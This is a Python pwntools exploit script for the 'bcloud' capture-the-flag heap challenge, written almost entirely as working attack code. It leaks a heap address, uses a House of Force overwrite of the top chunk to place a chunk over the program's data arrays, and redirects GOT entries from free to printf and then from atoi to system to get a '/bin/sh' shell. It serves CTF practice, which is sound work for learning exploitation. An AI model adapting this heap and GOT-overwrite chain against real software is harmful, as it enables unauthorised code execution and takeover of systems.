#!/usr/bin/env python
# coding=utf-8
# by muhe

from pwn import *
context.log_level = 'debug'

name_addr = 0x0804B0CC
bss_addr  = 0x0804b0a0
atoi = 0x0804b03c
free = 0x0804b014
printf_plt = 0x080484D0
'''
chunk_length[]   ----> 0x0804b0a0
chunk_status[]
chunk_list[]     ----> 0x0804B120
'''

#target = "./bcloud"
#p = process(target)
p = remote('127.0.0.1',10001)
#p = context(target)

def new_note(p,length,content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('content:')
    p.sendline(str(length))
    p.recvuntil('content:') 
    p.sendline(str(content))


def edit_note(p,index,new_content):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('id:')
    p.sendline(str(index))
    p.recvuntil('content:')
    p.sendline(str(new_content))
    

def delete_note(p,index):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('id:')
    p.sendline(str(index))


def main():
    
    # leak heap address
    name = "A"*60+"BBBB"
    p.send(name)
    p.recvuntil('BBBB')
    leak = u32(p.recv(4))
    print hex(leak)

    # hof here
    usr_host = "B"*0x40
    fuck_top_chunk = "\xff\xff\xff\xff"
    p.send(usr_host)
    p.sendline(fuck_top_chunk)

    # get list_length chunk..
    size = (bss_addr-0x8)-leak-0x8 - 208
    new_note(p,size,'AAAA')
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('content:')
    p.sendline('172')

    #fill the list_length[] && list_content[]
    payload = p32(4)
    payload += p32(4)
    payload += p32(4)
    payload += p32(0) * 29
    payload += p32(atoi)
    payload += p32(free)
    payload += p32(atoi)
    payload += p32(0) * 8
    p.send(payload)

    # change free() to printf()
    raw_input('$debug...')
    p.sendline('3')
    p.sendline('1')
    p.send(p32(printf_plt))

    # leak addr of atoi()
    delete_note(p,0)
    garbage = p.recvuntil("Input the id:\n")
    leak_atoi = u32(p.recv(4))
    print "got atoi() ---->"+hex(leak_atoi)
    
    # get system() addr
    system_addr = leak_atoi + 0xd8f0
    # overwrite atoi() to system() && getshell
    p.sendline('3')
    p.sendline('2')
    p.send(p32(system_addr))
    garbage = p.recv()
    p.sendline("/bin/sh\x00")

    p.interactive()

if __name__ == '__main__':
    main()
